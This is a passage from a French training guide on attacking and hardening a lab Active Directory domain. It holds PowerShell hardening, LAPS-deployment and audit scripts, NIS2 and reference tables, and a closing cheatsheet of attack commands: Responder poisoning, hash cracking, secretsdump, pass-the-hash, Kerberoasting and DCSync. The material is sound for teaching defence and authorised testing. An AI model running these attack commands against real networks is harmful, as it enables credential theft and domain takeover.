    de pénétration du module 10. Il doit être exécuté avec
    les droits d'administrateur du domaine.
.NOTES
    Auteur : Red Team CorpShadow
    Version : 1.0
    Date : 2025-05-30
#>

# Vérifier que le script est exécuté avec les droits administrateur
# [Security.Principal.WindowsPrincipal] interroge le jeton d'accès du processus
# pour vérifier si l'utilisateur appartient au groupe Administrateurs intégré
$isAdmin = [Security.Principal.WindowsPrincipal]::new(
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Error "Ce script doit être exécuté en tant qu'Administrateur"
    exit 1  # Quitte le script avec code d'erreur 1
}

Write-Host "=== Début du durcissement AD CorpShadow ===" -ForegroundColor Cyan

# ============================================
# 1. Désactiver LLMNR (Link-Local Multicast Name Resolution)
#    Empêche l'empoisonnement de la résolution de noms locale
# ============================================
Write-Host "[1/8] Désactivation de LLMNR..." -ForegroundColor Yellow
try {
    # Chemin registre de la politique DNS sous Local Machine
    $llmnrPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient"
    # Test-Path vérifie si la clé existe ; si non, New-Item la crée
    if (-not (Test-Path $llmnrPath)) {
        New-Item -Path $llmnrPath -Force | Out-Null  # Out-Null supprime la sortie
    }
    # EnableMulticast = 0 désactive LLMNR (valeur par défaut : 1 = activé)
    Set-ItemProperty -Path $llmnrPath -Name "EnableMulticast" -Value 0
    Write-Host "  ✓ LLMNR désactivé" -ForegroundColor Green
} catch {
    # $_ contient le message d'erreur de la dernière exception
    Write-Error "  ✗ Échec : $_"
}

# ============================================
# 2. Désactiver NBT-NS (NetBIOS Name Service)
#    via les paramètres TCP/IP de chaque carte réseau
# ============================================
Write-Host "[2/8] Désactivation de NBT-NS..." -ForegroundColor Yellow
try {
    # Get-WmiObject interroge WMI pour lister les configurations réseau
    # Where-Object filtre : ne garder que les cartes avec IP activée
    $adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
    foreach ($adapter in $adapters) {
        # SetTcpipNetbios(2) : 0 = utiliser paramètre DHCP, 1 = activer, 2 = désactiver
        $result = $adapter.SetTcpipNetbios(2)
        if ($result.ReturnValue -eq 0) {  # 0 = succès
            Write-Host "  ✓ NBT-NS désactivé sur $($adapter.Description)" -ForegroundColor Green
        } else {
            Write-Warning "  ⚠ Échec sur $($adapter.Description) (code: $($result.ReturnValue))"
        }
    }
} catch {
    Write-Error "  ✗ Échec : $_"
}

# ============================================
# 3. Activer SMB Signing (protection contre le relay SMB)
#    Empêche les attaques de type SMB Relay / NTLM Relay
# ============================================
Write-Host "[3/8] Activation de SMB Signing..." -ForegroundColor Yellow
try {
    # Côté serveur (LanmanServer) : Require = exigé, Enable = activé
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
        -Name "RequireSecuritySignature" -Value 1
    # Côté client (LanmanWorkstation) : exiger la signature des réponses
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" `
        -Name "RequireSecuritySignature" -Value 1
    # EnableSecuritySignature : activer la signature même si non requise
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
        -Name "EnableSecuritySignature" -Value 1
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" `
        -Name "EnableSecuritySignature" -Value 1
    Write-Host "  ✓ SMB Signing activé" -ForegroundColor Green
} catch {
    Write-Error "  ✗ Échec : $_"
}

# ============================================
# 4. Activer Windows Defender Credential Guard
#    Isole LSASS dans un conteneur virtualisé (protection matérielle)
# ============================================
Write-Host "[4/8] Activation de Windows Defender Credential Guard..." -ForegroundColor Yellow
try {
    # Vérifier la version du système d'exploitation (>= Windows Server 2016)
    $osInfo = Get-WmiObject Win32_OperatingSystem
    if ($osInfo.Version -ge "10.0.14393") {  # 10.0.14393 = Windows Server 2016 RTM
        # Créer la clé LsaCfgFlags si elle n'existe pas
        $credGuardPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
        if (-not (Test-Path "$credGuardPath\LsaCfgFlags")) {
            New-Item -Path $credGuardPath -Name "LsaCfgFlags" -Force | Out-Null
        }
        # Valeur 1 = Credential Guard avec UEFI lock (recommandé)
        # Valeur 2 = sans UEFI lock (peut être désactivé via GPO)
        Set-ItemProperty -Path $credGuardPath -Name "LsaCfgFlags" -Value 1
        Write-Host "  ✓ Credential Guard activé (redémarrage nécessaire)" -ForegroundColor Green
    } else {
        Write-Warning "  ⚠ Système non compatible (Windows Server 2016+ requis)"
    }
} catch {
    Write-Error "  ✗ Échec : $_"
}

# ============================================
# 5. Désactiver WDigest (empêche le stockage du mot de passe en clair)
#    WDigest stockait le mot de passe en clair en mémoire pour l'héritage
# ============================================
Write-Host "[5/8] Désactivation de WDigest..." -ForegroundColor Yellow
try {
    # UseLogonCredential = 0 désactive le stockage du mot de passe en clair
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
        -Name "UseLogonCredential" -Value 0
    # Negotiate = 0 désactive la négociation WDigest
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
        -Name "Negotiate" -Value 0
    Write-Host "  ✓ WDigest désactivé" -ForegroundColor Green
} catch {
    Write-Error "  ✗ Échec : $_"
}

# ============================================
# 6. Restreindre l'accès au registre distant
#    Empêche secretsdump d'accéder aux ruches SAM/SYSTEM à distance
# ============================================
Write-Host "[6/8] Restriction de l'accès au registre distant..." -ForegroundColor Yellow
try {
    # RemoteRegAccess = 1 limite l'accès aux administrateurs authentifiés
    # Valeur 0 = accès ouvert à tout utilisateur authentifié
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg" `
        -Name "RemoteRegAccess" -Value 1
    Write-Host "  ✓ Accès au registre distant restreint" -ForegroundColor Green
} catch {
    Write-Error "  ✗ Échec : $_"
}

# ============================================
# 7. Activer les types de chiffrement AES256 pour les comptes de service
#    Remplace RC4 (vulnérable au Kerberoasting) par AES128 + AES256
# ============================================
Write-Host "[7/8] Configuration des types de chiffrement AES256..." -ForegroundColor Yellow
try {
    # Liste des comptes de service à migrer vers AES
    $serviceAccounts = @("svc_backup", "svc_sql")
    foreach ($sam in $serviceAccounts) {
        try {
            # Get-ADUser récupère l'utilisateur AD et ses types de chiffrement
            $user = Get-ADUser -Identity $sam -Properties msDS-SupportedEncryptionTypes
            if ($user) {
                # msDS-SupportedEncryptionTypes = 24 signifie AES128 (8) + AES256 (16)
                # Cela désactive RC4 (4) qui est requis par le Kerberoasting
                Set-ADUser -Identity $sam -Replace @{
                    "msDS-SupportedEncryptionTypes" = 24
                } -ErrorAction Stop
                Write-Host "  ✓ AES activé pour $sam" -ForegroundColor Green
            }
        } catch {
            Write-Warning "  ⚠ Compte $sam non trouvé : $_"
        }
    }
} catch {
    Write-Error "  ✗ Échec global : $_"
}

# ============================================
# 8. Appliquer la politique de mot de passe renforcée
#    Conforme aux recommandations ANSSI et NIS2
# ============================================
Write-Host "[8/8] Application de la politique de mot de passe..." -ForegroundColor Yellow
try {
    # Import-Module ActiveDirectory charge le module AD (nécessite RSAT)
    # -ErrorAction SilentlyContinue ignore l'erreur si le module n'existe pas
    Import-Module ActiveDirectory -ErrorAction SilentlyContinue

    if (Get-Module -Name ActiveDirectory) {
        # Set-ADDefaultDomainPasswordPolicy configure la politique de mot de passe du domaine
        Set-ADDefaultDomainPasswordPolicy `
            -Identity corp.shadow.local `       # Domaine cible
            -MinPasswordLength 14 `              # Longueur minimale : 14 caractères
            -MaxPasswordAge 90 `                 # Expiration : 90 jours max
            -MinPasswordAge 1 `                  # 1 jour minimum avant changement (anti-rejeu)
            -PasswordHistoryCount 24 `           # Mémorise les 24 derniers mots de passe
            -ReversibleEncryptionEnabled $false ` # Pas de stockage réversible (chiffrement faible)
            -ComplexityEnabled $true `            # Complexité obligatoire (majuscule, chiffre, spécial)
            -LockoutThreshold 5 `                 # Verrouillage après 5 tentatives échouées
            -LockoutDuration 30 `                 # Durée de verrouillage : 30 minutes
            -LockoutObservationWindow 30          # Fenêtre d'observation : 30 minutes

        Write-Host "  ✓ Politique de mot de passe appliquée" -ForegroundColor Green
    } else {
        Write-Warning "  ⚠ Module Active Directory non disponible — politique non appliquée"
    }
} catch {
    Write-Error "  ✗ Échec : $_"
}

Write-Host "=== Durcissement terminé ===" -ForegroundColor Cyan
Write-Host "Certains changements nécessitent un redémarrage." -ForegroundColor Magenta
```

**Explication des principales commandes du script :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `[Security.Principal.WindowsPrincipal]::new(...).IsInRole(...)` | Vérifie si le script est exécuté avec les droits Administrateur |
| `Set-ItemProperty -Path HKLM:\... -Name "EnableMulticast" -Value 0` | Désactive LLMNR (résolution de noms multicast) |
| `$adapter.SetTcpipNetbios(2)` | Désactive NetBIOS sur TCP/IP (2 = désactivé) via WMI |
| `Set-ItemProperty ... RequireSecuritySignature -Value 1` | Active la signature SMB obligatoire (anti-relay) |
| `Set-ItemProperty ... LsaCfgFlags -Value 1` | Active Credential Guard (isole LSASS dans un conteneur virtualisé) |
| `Set-ItemProperty ... WDigest\UseLogonCredential -Value 0` | Empêche WDigest de stocker le mot de passe en clair en mémoire |
| `Set-ItemProperty ... RemoteRegAccess -Value 1` | Restreint l'accès distant au registre |
| `Set-ADUser -Replace @{"msDS-SupportedEncryptionTypes" = 24}` | Configure AES128+AES256 pour les comptes de service (désactive RC4) |
| `Set-ADDefaultDomainPasswordPolicy -MinPasswordLength 14 ...` | Applique une politique de mot de passe forte (conforme NIS2) |

#### 9.2.2 Déploiement LAPS automatisé

```powershell
<#
.SYNOPSIS
    Déploiement automatisé de LAPS (Local Administrator Password Solution)
.DESCRIPTION
    Ce script installe et configure LAPS pour l'ensemble du domaine CorpShadow.
    Nécessite le fichier d'installation LAPS.x64.msi disponible sur le partage.
#>

# Variables de configuration
$domain = "corp.shadow.local"
# Chemin de l'installateur LAPS sur le partage SYSVOL du DC
$lapsInstaller = "\\DC01\SYSVOL\corp.shadow.local\scripts\LAPS.x64.msi"

Write-Host "=== Déploiement LAPS ===" -ForegroundColor Cyan

# Vérifier la présence du fichier d'installation avant de commencer
if (-not (Test-Path $lapsInstaller)) {
    Write-Error "Installateur LAPS introuvable : $lapsInstaller"
    exit 1
}

# Étape 1 : Étendre le schéma AD avec les attributs LAPS
# Ajoute les attributs ms-Mcs-AdmPwd et ms-Mcs-AdmPwdExpirationTime
Write-Host "[1/5] Extension du schéma AD..." -ForegroundColor Yellow
try {
    # Import-Module AdmPwd.PS charge le module LAPS (fourni avec l'installateur)
    Import-Module AdmPwd.PS -ErrorAction Stop
    # Update-AdmPwdADSchema modifie le schéma AD pour ajouter les attributs LAPS
    Update-AdmPwdADSchema
    Write-Host "  ✓ Schéma AD étendu" -ForegroundColor Green
} catch {
    Write-Error "  ✗ Échec : $_"
    exit 1
}

# Étape 2 : Déléguer les droits aux ordinateurs pour qu'ils puissent écrire leur mot de passe
Write-Host "[2/5] Délégation des droits..." -ForegroundColor Yellow
try {
    # Liste des unités d'organisation (OU) à configurer
    $ous = @(
        "OU=Workstations,DC=corp,DC=shadow,DC=local",
        "OU=Servers,DC=corp,DC=shadow,DC=local"
    )
    foreach ($ou in $ous) {
        try {
            # Set-AdmPwdComputerSelfPermission donne aux ordinateurs de l'OU
            # le droit d'écrire leur propre mot de passe dans l'attribut AD
            Set-AdmPwdComputerSelfPermission -OrgUnit $ou
            Write-Host "  ✓ Droits délégués pour $ou" -ForegroundColor Green
        } catch {
            Write-Warning "  ⚠ OU $ou non trouvée"
        }
    }
} catch {
    Write-Error "  ✗ Échec : $_"
}

# Étape 3 : Créer une GPO pour déployer le client LAPS sur toutes les machines
Write-Host "[3/5] Création de la GPO de déploiement LAPS..." -ForegroundColor Yellow
try {
    $gpoName = "LAPS - Local Admin Password Solution"
    # Get-GPO vérifie si la GPO existe déjà (pour éviter les doublons)
    $gpo = Get-GPO -Name $gpoName -ErrorAction SilentlyContinue

    if (-not $gpo) {
        # New-GPO crée une nouvelle GPO avec description
        $gpo = New-GPO -Name $gpoName -Comment "Déploie LAPS sur toutes les machines"
        # Set-GPRegistryValue configure une valeur registre via GPO
        # AdmPwdEnabled = 1 active LAPS sur les machines cibles
        Set-GPRegistryValue `
            -Name $gpoName `
            -Key "HKLM\Software\Policies\Microsoft Services\AdmPwd" `
            -ValueName "AdmPwdEnabled" `
            -Type DWord `
            -Value 1

        # New-GPLink lie la GPO au domaine (elle s'appliquera à toutes les machines)
        New-GPLink -Name $gpoName -Target "dc=corp,dc=shadow,dc=local"

        # Set-GPPermission donne le droit de lecture aux ordinateurs du domaine
        Set-GPPermission -Name $gpoName -TargetType Computer -TargetName "Domain Computers" -PermissionLevel Read

        Write-Host "  ✓ GPO $gpoName créée" -ForegroundColor Green
    } else {
        Write-Host "  ✓ GPO $gpoName existe déjà" -ForegroundColor Yellow
    }
} catch {
    Write-Error "  ✗ Échec : $_"
}

# Étape 4 : Vérifier que LAPS est correctement installé
Write-Host "[4/5] Vérification de LAPS..." -ForegroundColor Yellow
try {
    # Vérifier que LAPS est installé sur le DC via WMI
    $lapsInstalled = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -like "*LAPS*" }
    if (-not $lapsInstalled) {
        Write-Warning "  ⚠ LAPS n'est pas installé sur le DC — installation en cours..."
        # Start-Process msiexec.exe lance l'installateur Windows
        # /i = install, /quiet = silencieux, -Wait = attend la fin
        Start-Process msiexec.exe -ArgumentList "/i $lapsInstaller /quiet" -Wait
    }

    # Vérifier que les attributs AD LAPS existent dans le schéma
    $schema = Get-ADObject "CN=ms-Mcs-AdmPwd,CN=Schema,CN=Configuration,DC=corp,DC=shadow,DC=local" `
        -ErrorAction SilentlyContinue
    if ($schema) {
        Write-Host "  ✓ Attribut ms-Mcs-AdmPwd trouvé dans le schéma" -ForegroundColor Green
    }
} catch {
    Write-Error "  ✗ Échec : $_"
}

# Étape 5 : Générer un rapport des mots de passe administrateur LAPS
Write-Host "[5/5] Génération du rapport..." -ForegroundColor Yellow
try {
    # Get-ADComputer liste tous les ordinateurs du domaine
    # -Properties ms-Mcs-AdmPwd récupère l'attribut contenant le mot de passe
    # Where-Object filtre : ne garder que les machines ayant un mot de passe LAPS
    # Select-Object formate la sortie avec Nom, Mot de passe et Expiration
    Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime | `
        Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | `
        Select-Object Name, @{N="Password";E={$_.'ms-Mcs-AdmPwd'}}, @{N="Expiration";E={
            if ($_.'ms-Mcs-AdmPwdExpirationTime') {
                # [DateTime]::FromFileTime convertit un timestamp Windows FileTime en DateTime
                [DateTime]::FromFileTime($_.'ms-Mcs-AdmPwdExpirationTime')
            }
        }} | Format-Table -AutoSize

    Write-Host "  ✓ Rapport généré" -ForegroundColor Green
} catch {
    Write-Warning "  ⚠ Aucun mot de passe LAPS trouvé (normal — les clients doivent appliquer la GPO d'abord)"
}

Write-Host "=== Déploiement LAPS terminé ===" -ForegroundColor Cyan
Write-Host "Les clients appliqueront la GPO lors de leur prochaine actualisation (90 min par défaut)." -ForegroundColor Magenta
Write-Host "Pour forcer : gpupdate /force sur chaque machine." -ForegroundColor Magenta
```

**Explication des principales commandes du script LAPS :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `Test-Path $lapsInstaller` | Vérifie que le fichier d'installation LAPS existe sur le partage SYSVOL |
| `Import-Module AdmPwd.PS` | Charge le module PowerShell LAPS pour la gestion administrative |
| `Update-AdmPwdADSchema` | Étend le schéma AD avec les attributs LAPS (ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime) |
| `Set-AdmPwdComputerSelfPermission -OrgUnit $ou` | Délègue aux ordinateurs d'une OU le droit d'écrire leur mot de passe LAPS dans AD |
| `New-GPO -Name "LAPS..."` | Crée une GPO pour déployer la configuration LAPS sur tout le domaine |
| `Set-GPRegistryValue ... AdmPwdEnabled = 1` | Active LAPS via la GPO (valeur registre) |
| `New-GPLink -Name $gpo -Target "dc=..."` | Lie la GPO au domaine pour application à toutes les machines |
| `Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd` | Liste les mots de passe administrateur LAPS de toutes les machines du domaine |

### 9.3 Audit de sécurité post-exercice

```powershell
<#
.SYNOPSIS
    Script d'audit rapide pour vérifier les vulnérabilités corrigées
.DESCRIPTION
    Vérifie que toutes les mesures de durcissement du script 9.2.1
    ont bien été appliquées sur le domaine CorpShadow
#>

Write-Host "=== Audit de sécurité CorpShadow ===" -ForegroundColor Cyan

# Tableau pour stocker les résultats des tests
$results = @()

# 1. Vérifier que LLMNR est désactivé
# Get-ItemProperty lit la valeur EnableMulticast dans le registre
# Si la valeur est 0, LLMNR est désactivé ; sinon il est vulnérable
$llmnr = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" `
    -Name "EnableMulticast" -ErrorAction SilentlyContinue
$results += [PSCustomObject]@{
    Test = "LLMNR désactivé"
    Status = if ($llmnr.EnableMulticast -eq 0) { "✓ OK" } else { "✗ VULNÉRABLE" }
}

# 2. Vérifier que SMB Signing est activé (côté serveur)
# RequireSecuritySignature = 1 signifie que la signature SMB est obligatoire
$smbServer = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
    -Name "RequireSecuritySignature" -ErrorAction SilentlyContinue
$results += [PSCustomObject]@{
    Test = "SMB Signing (serveur)"
    Status = if ($smbServer.RequireSecuritySignature -eq 1) { "✓ OK" } else { "✗ VULNÉRABLE" }
}

# 3. Vérifier que Credential Guard est activé
# LsaCfgFlags >= 1 signifie que Credential Guard est actif
$lsaCfg = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
    -Name "LsaCfgFlags" -ErrorAction SilentlyContinue
$results += [PSCustomObject]@{
    Test = "Credential Guard"
    Status = if ($lsaCfg.LsaCfgFlags -ge 1) { "✓ OK" } else { "✗ VULNÉRABLE" }
}

# 4. Vérifier que WDigest est désactivé (pas de stockage en clair)
# UseLogonCredential = 0 signifie que le stockage en clair est désactivé
$wdigest = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
    -Name "UseLogonCredential" -ErrorAction SilentlyContinue
$results += [PSCustomObject]@{
    Test = "WDigest désactivé"
    Status = if ($wdigest.UseLogonCredential -eq 0) { "✓ OK" } else { "✗ VULNÉRABLE" }
}

# 5. Vérifier que le service Remote Registry est arrêté
# Get-Service interroge le gestionnaire de services Windows
# Status "Stopped" signifie que le service est désactivé (empêche l'accès distant au registre)
$remoteReg = Get-Service -Name "RemoteRegistry" -ErrorAction SilentlyContinue
$results += [PSCustomObject]@{
    Test = "Remote Registry désactivé"
    Status = if ($remoteReg.Status -eq "Stopped") { "✓ OK" } else { "✗ VULNÉRABLE" }
}

# 6. Vérifier que LAPS est installé
# Get-WmiObject interroge WMI pour lister les logiciels installés
# Where-Object filtre pour trouver ceux contenant "LAPS" dans leur nom
$lapsInstalled = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -like "*LAPS*" }
$results += [PSCustomObject]@{
    Test = "LAPS installé"
    Status = if ($lapsInstalled) { "✓ OK" } else { "⚠ Non installé" }
}

# 7. Vérifier la longueur minimale du mot de passe
# Get-ADDefaultDomainPasswordPolicy récupère la politique de mot de passe du domaine
try {
    $policy = Get-ADDefaultDomainPasswordPolicy -ErrorAction Stop
    $results += [PSCustomObject]@{
        Test = "Longueur minimale mot de passe (≥14)"
        Status = if ($policy.MinPasswordLength -ge 14) { "✓ OK ($($policy.MinPasswordLength))" } else { "✗ VULNÉRABLE ($($policy.MinPasswordLength))" }
    }
} catch {
    # Si le module AD n'est pas disponible, on ne peut pas vérifier
    $results += [PSCustomObject]@{
        Test = "Politique mot de passe"
        Status = "⚠ Impossible de vérifier"
    }
}

# Afficher les résultats sous forme de tableau
$results | Format-Table -AutoSize

# Compter le nombre de vulnérabilités et afficher un résumé
$vulnerable = $results | Where-Object { $_.Status -like "*VULNÉRABLE*" }
if ($vulnerable) {
    Write-Host "ATTENTION : $($vulnerable.Count) point(s) vulnérable(s) détecté(s) !" -ForegroundColor Red
} else {
    Write-Host "Aucune vulnérabilité critique détectée." -ForegroundColor Green
}
```

**Explication des commandes du script d'audit :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `Get-ItemProperty ... EnableMulticast` | Vérifie si LLMNR est désactivé (0 = OK, 1 = vulnérable) |
| `Get-ItemProperty ... RequireSecuritySignature` | Vérifie si la signature SMB est obligatoire (1 = OK) |
| `Get-ItemProperty ... LsaCfgFlags` | Vérifie si Credential Guard est actif (>= 1 = OK) |
| `Get-ItemProperty ... UseLogonCredential` | Vérifie si WDigest est désactivé (0 = OK) |
| `Get-Service -Name "RemoteRegistry"` | Vérifie si le service Remote Registry est arrêté (Stopped = OK) |
| `Get-WmiObject -Class Win32_Product \| Where-Object { \$_.Name -like "*LAPS*" }` | Vérifie si LAPS est installé via WMI |
| `Get-ADDefaultDomainPasswordPolicy` | Vérifie la politique de mot de passe du domaine (>= 14 caractères = OK) |
| `$results \| Format-Table -AutoSize` | Affiche les résultats dans un tableau formaté automatiquement |
| `Where-Object { \$_.Status -like "*VULNÉRABLE*" }` | Filtre les résultats vulnérables pour le résumé |

### 9.4 Guide de réponse NIS2

| Mesure NIS2 | Mise en œuvre | Statut |
|-------------|---------------|--------|
| Article 21(2)(a) — Politique d'analyse des risques | Audit AD trimestriel | ⬜ À implémenter |
| Article 21(2)(b) — Gestion des incidents | Plan de réponse aux incidents AD (mots de passe volés, tickets forgés) | ⬜ À implémenter |
| Article 21(2)(c) — Continuité d'activité | Backup NTDS.dit + procédure de restauration KRBTGT | ⬜ À implémenter |
| Article 21(2)(d) — Sécurité de la chaîne d'approvisionnement | Revue des comptes de service et fournisseurs | ⬜ À implémenter |
| Article 21(2)(e) — Sécurité des achats | Standards de configuration AD pour nouveaux serveurs | ⬜ À implémenter |
| Article 21(2)(f) — Gestion des vulnérabilités | Scan mensuel AD + test de pénétration annuel | ⬜ À implémenter |
| Article 21(2)(g) — Formation et sensibilisation | Formation AD sécurité pour les admins | ⬜ À implémenter |
| Article 21(2)(h) — Cryptographie | AES256 pour Kerberos, désactiver RC4 | ⬜ À implémenter |
| Article 21(2)(i) — Sécurité des ressources humaines | Revue des accès après départ des employés | ⬜ À implémenter |
| Article 21(2)(j) — Contrôle d'accès | MFA obligatoire pour tous les comptes administratifs | ⬜ À implémenter |

---

## 10. Références et ressources

### 10.1 Documentation technique

| Ressource | URL |
|-----------|-----|
| BloodHound Wiki (GitHub) | https://github.com/BloodHoundAD/BloodHound/wiki |
| BloodHound Python Ingestor | https://github.com/fox-it/BloodHound.py |
| Impacket Documentation | https://github.com/fortra/impacket |
| Responder Framework | https://github.com/lgandx/Responder |
| John the Ripper | https://github.com/openwall/john |
| Hashcat | https://github.com/hashcat/hashcat |
| Mimikatz | https://github.com/gentilkiwi/mimikatz |
| LAPS (Microsoft) | https://www.microsoft.com/en-us/download/details.aspx?id=46899 |

### 10.2 MITRE ATT&CK

| ID | Technique | URL |
|----|-----------|-----|
| T1087.002 | Account Discovery: Domain Account | https://attack.mitre.org/techniques/T1087/002/ |
| T1557.001 | LLMNR/NBT-NS Poisoning and SMB Relay | https://attack.mitre.org/techniques/T1557/001/ |
| T1110.002 | Password Cracking | https://attack.mitre.org/techniques/T1110/002/ |
| T1003.002 | SAM Dumping | https://attack.mitre.org/techniques/T1003/002/ |
| T1550.002 | Pass-the-Hash | https://attack.mitre.org/techniques/T1550/002/ |
| T1558.003 | Kerberoasting | https://attack.mitre.org/techniques/T1558/003/ |
| T1003.006 | DCSync | https://attack.mitre.org/techniques/T1003/006/ |
| T1558.001 | Golden Ticket | https://attack.mitre.org/techniques/T1558/001/ |

### 10.3 Guides de remédiation

| Guide | URL |
|-------|-----|
| Microsoft — Securing Active Directory | https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices |
| ANSSI — Guide d'administration sécurisée d'Active Directory | https://www.ssi.gouv.fr/guide/recommandations-de-securite-relatives-a-active-directory/ |
| ANSSI — Guide NIS2 | https://www.ssi.gouv.fr/entreprise/reglementation/nis-2/ |
| CIS Benchmarks — Windows Server 2022 | https://www.cisecurity.org/benchmark/microsoft_windows_server/ |
| Microsoft — LAPS Deployment | https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview |
| Microsoft — Credential Guard | https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard |
| Microsoft — Responder mitigation | https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/llmnr-not-supported-in-domain-environment |

### 10.4 Outils complémentaires pour l'approfondissement

| Outil | Utilité | Lien |
|-------|---------|------|
| Rubeus | Kerberos interaction (C#) | https://github.com/GhostPack/Rubeus |
| PowerView | PowerShell AD enumeration | https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon |
| CrackMapExec | Post-exploitation automatisée | https://github.com/byt3bl33d3r/CrackMapExec |
| NetExec | Fork de CME (maintenu) | https://github.com/Pennyw0rth/NetExec |
| Certipy | AD Certificate Services exploitation | https://github.com/ly4k/Certipy |
| PKINITtools | Kerberos PKINIT abuse | https://github.com/dirkjanm/PKINITtools |
| Whisker | MS-DS-MachineAccountQuota exploitation | https://github.com/eladshamir/Whisker |
| Pre2k | Pre-Windows 2000 computer abuse | https://github.com/n00py/LAPSToolkit |

### 10.5 Laboratoires et plateformes d'entraînement

| Plateforme | Description | URL |
|------------|-------------|-----|
| HackTheBox — Active Directory track | Machines AD variées | https://www.hackthebox.com/ |
| TryHackMe — AD rooms | Salles dédiées AD | https://tryhackme.com/ |
| PentesterLab — Active Directory | Exercices AD progressifs | https://pentesterlab.com/ |
| GOAD (Game of Active Directory) | Lab AD complet autocontenu | https://github.com/Orange-Cyberdefense/GOAD |

---

## Annexe A : Aide-mémoire rapide (cheatsheet)

```bash
# ============================================
# PHASE 1 : ÉNUMÉRATION ACTIVE DIRECTORY
# ============================================

# BloodHound (ingestor) — cartographie complète du domaine
# Collecte : utilisateurs, groupes, ordinateurs, ACL, sessions, trusts
bloodhound-python -d corp.shadow.local -ns 10.10.10.10 -c all

# ldapsearch manuel — alternative à BloodHound pour lister les utilisateurs
# -x : authentification simple, -H : serveur LDAP, -b : base de recherche
# -s sub : recherche récursive, filtre : objets utilisateur, attribut : sAMAccountName
ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=shadow,DC=local" -s sub "(objectClass=user)" sAMAccountName

# ============================================
# PHASE 2 : CAPTURE DE HASH NTLMv2
# ============================================

# Responder — empoisonneur LLMNR/NBT-NS/mDNS
# -I eth0 : interface réseau, -r : NBT-NS, -d : DHCP, -w : WPAD, -v : verbeux
sudo responder -I eth0 -rdwv

# Crack du hash NTLMv2 avec john (the ripper)
# --wordlist : dictionnaire rockyou.txt (~14 millions de mots de passe courants)
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/ntlmv2_hash.txt

# Crack avec hashcat (plus rapide si GPU disponible)
# -m 5600 : mode NetNTLMv2, --force : ignorer les avertissements
hashcat -m 5600 /tmp/ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt --force

# ============================================
# PHASE 3 : DUMP DE HASHES (SAM / LSA)
# ============================================

# secretsdump — extraction des hashes à distance via SMB/registre
# Format : DOMAINE/utilisateur:'mot_de_passe'@IP_cible
impacket-secretsdump CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.20

# ============================================
# PHASE 4 : PASS-THE-HASH (Mouvement latéral)
# ============================================

# wmiexec — exécution via WMI (furtif, pas de création de service)
# -hashes LM_HASH:NT_HASH (LM vide = aad3b435b51404eeaad3b435b51404ee)
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH> CORPSHADOW/jdoe@10.10.10.20

# psexec — crée un service Windows (bruyant, facilement détectable)
impacket-psexec -hashes :<NT_HASH> CORPSHADOW/jdoe@10.10.10.20

# smbexec — via SVCCTL (plus furtif que psexec, pas de fichier copié)
impacket-smbexec -hashes :<NT_HASH> CORPSHADOW/jdoe@10.10.10.20

# ============================================
# PHASE 5 : KERBEROASTING
# ============================================

# Lister les SPNs (comptes de service avec Service Principal Name)
impacket-GetUserSPNs CORPSHADOW/jdoe:'P@ssw0rd!2025' -dc-ip 10.10.10.10

# Demander et exporter les TGS (tickets Kerberos chiffrés avec le hash du service)
# -request : demande le TGS, -outputfile : sauvegarde pour crack
impacket-GetUserSPNs CORPSHADOW/jdoe:'P@ssw0rd!2025' -dc-ip 10.10.10.10 -request -outputfile /tmp/tgs.txt

# Crack du TGS avec hashcat (mode Kerberos 5 TGS-REP, etype 23 = RC4-HMAC)
# -m 13100 : mode Kerberos 5 TGS-REP, --force : ignorer les avertissements
hashcat -m 13100 /tmp/tgs.txt /usr/share/wordlists/rockyou.txt --force

# ============================================
# PHASE 6 : DCSYNC + GOLDEN TICKET
# ============================================

# DCSync — extraire tous les hashes du domaine (nécessite privilèges admin)
# -just-dc : utilise DRSUAPI pour répliquer NTDS.dit
impacket-secretsdump CORPSHADOW/Administrator@10.10.10.10 -just-dc

# Récupérer le SID du domaine (nécessaire pour le Golden Ticket)
# lookupsid interroge via SAMR ; grep filtre la ligne "Domain SID"
